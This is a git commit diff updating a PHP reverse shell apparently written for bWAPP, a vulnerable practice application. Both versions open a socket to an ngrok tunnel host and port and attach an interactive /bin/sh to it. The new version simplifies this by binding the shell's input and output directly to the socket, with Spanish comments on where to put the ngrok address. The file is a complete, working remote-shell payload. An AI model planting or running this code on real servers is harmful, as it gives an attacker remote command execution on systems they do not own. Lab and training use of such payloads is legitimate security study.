b51e5b0a2bb8c1543b09196c281d01242552d574
OffShur3 <93799448+OffShur3@users.noreply.github.com>
2025-06-23 19:34:11 -0300

    Update Reverse_shell_bwapp.php

--- Reverse_shell_bwapp.php
+++ Reverse_shell_bwapp.php
@@ -1,41 +1,22 @@
 <?php
 set_time_limit(0);
-$ip = '0.tcp.sa.ngrok.io';  // Host de ngrok
-$port = 15383;              // Puerto asignado por ngrok
+$ip = '0.tcp.sa.ngrok.io';   // La IP / host público que te dio ngrok
+$port = 15383;           	// El puerto público que te dio ngrok
 
 $sock = fsockopen($ip, $port);
 if (!$sock) {
-    die("No se pudo conectar al host $ip en el puerto $port");
+	die("No se pudo conectar al host $ip en el puerto $port");
 }
 
 $proc = proc_open('/bin/sh -i', array(
-    0 => array("pipe", "r"),
-    1 => array("pipe", "w"),
-    2 => array("pipe", "w")
+	0 => $sock,
+	1 => $sock,
+	2 => $sock
 ), $pipes);
 
-// Redireccionar el socket al shell
-stream_set_blocking($pipes[0], false);
-stream_set_blocking($pipes[1], false);
-stream_set_blocking($pipes[2], false);
-stream_set_blocking($sock, false);
-
-while (1) {
-    if (feof($sock)) break;
-
-    $read = [$sock, $pipes[1], $pipes[2]];
-    $write = $except = null;
-    stream_select($read, $write, $except, null);
-
-    foreach ($read as $r) {
-        if ($r === $sock) {
-            fwrite($pipes[0], fread($sock, 2048));
-        } else {
-            fwrite($sock, fread($r, 2048));
-        }
-    }
+if (!is_resource($proc)) {
+	die("No se pudo iniciar el shell interactivo");
 }
 
-fclose($sock);
 proc_close($proc);
 ?>
